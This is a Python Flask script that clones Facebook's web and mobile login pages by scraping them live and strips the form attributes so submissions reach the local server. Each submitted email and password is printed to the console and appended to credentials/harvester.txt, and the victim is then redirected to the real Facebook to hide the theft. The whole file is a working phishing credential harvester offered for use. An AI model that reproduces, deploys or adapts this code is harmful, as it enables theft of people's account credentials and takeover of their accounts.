import requests
from flask import Flask, render_template,request,redirect
import json
import os
from bs4 import BeautifulSoup
import logging

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

add = '127.0.0.1'
lport = 5000

app = Flask(__name__, template_folder = 'html')

def getHTML(page):
    headers = {'Accept-Language':'en-US,en;q=0.5'}
    web_link = 'https://www.facebook.com/'
    mobile_link = 'https://m.facebook.com'

    if page is 'web':
        response = requests.get(web_link, headers = headers).text
        soup = BeautifulSoup(response, 'html.parser')

        login_form = soup.find('form',{'id':'login_form'})
        login_form['action'] = ''
        del login_form['novalidate']
        del login_form['onsubmit']
        del login_form['data-testid']

        email = login_form.find('input',{'id':'email'})
        psswrd = login_form.find('input',{'id':'pass'})
        email['value'] = "{{request.form.username}}"
        psswrd['value'] = "{{request.form.password}}"

        with open('html/fb.html', 'w', encoding = 'utf-8') as f:
            f.write(soup.prettify())

    if page is 'mobile':
        response = requests.get(mobile_link, headers = headers).text
        soup = BeautifulSoup(response, 'html.parser')

        login_form = soup.find('form',{'id':'login_form'})
        del login_form['action']
        del login_form['novalidate']

        with open('html/mobile.html', 'w', encoding = 'utf-8') as f:
            f.write(soup.prettify())

@app.route('/',methods = ['GET','POST'])
def homepage():
    if request.method == 'POST':

        print('    email : {},  \n    password : {}'.format(request.form['email'],request.form['pass']))
        with open('credentials/harvester.txt', 'a', encoding = 'utf-8') as f:
             f.write(json.dumps({'email' : request.form['email'],
                                 'password' : request.form['pass']}
                                 ,indent=4,sort_keys=True))

        return redirect('https://www.facebook.com')

    if request.method == 'GET':
        print('[*] User Connected Through Web...')
        return render_template("fb.html")

@app.route('/mob',methods = ['GET','POST'])
def mobpage():
    if request.method == 'POST':

        print('    email : {},  \n    password : {}'.format(request.form['email'],request.form['pass']))
        with open('credentials/harvester.txt', 'a', encoding = 'utf-8') as f:
             f.write(json.dumps({'email' : request.form['email'],
                                 'password' : request.form['pass']}
                                 ,indent=4,sort_keys=True))
        return redirect('https://m.facebook.com')

    if request.method == 'GET':
        print('[*] User Connected Through Mobile...')
        return render_template("mobile.html")

if __name__ == '__main__':

    if not os.path.exists('html/fb.html'):
        print('[*] Getting Web HTML File...')
        getHTML(page = 'web')

    if not os.path.exists('html/mobile.html'):
        print('[*] Getting Mobile HTML File...')
        getHTML(page = 'mobile')

    else:
        print('[*] Files Already Present...')

    print('[*] You will be notified in console as soon as a user connects whether through mobile or web. \n    Username and Password will be displayed in-console when user submits it as well as will be saved in harvester.txt in credentials folder.\n    Started At Address : '+add +'\n')

    app.run(host = add , port = lport)
